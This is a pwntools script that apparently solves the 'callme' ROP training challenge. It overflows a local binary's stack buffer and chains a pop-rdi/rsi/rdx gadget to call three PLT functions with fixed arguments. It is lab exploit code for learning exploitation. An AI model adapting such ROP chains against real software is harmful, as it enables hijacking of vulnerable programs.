#!/usr/bin/env python

from pwn import *

p = process("./callme")

p.recv(1024)

payload = (
    "\x90" * 40 +
    p64(0x401ab0) + # pop rdi ; pop rsi ; pop rdx ; ret
    p64(0x1) + p64(0x2) + p64(0x3) +
    p64(0x401850) + # <callme_one@plt>

    p64(0x401ab0) + # pop rdi ; pop rsi ; pop rdx ; ret
    p64(0x1) + p64(0x2) + p64(0x3) +
    p64(0x401870) + # <callme_two@plt>

    p64(0x401ab0) + # pop rdi ; pop rsi ; pop rdx ; ret
    p64(0x1) + p64(0x2) + p64(0x3) +
    p64(0x401810)  # <callme_three@plt>
)

p.sendline(payload)
print(p.recvall())
p.close()
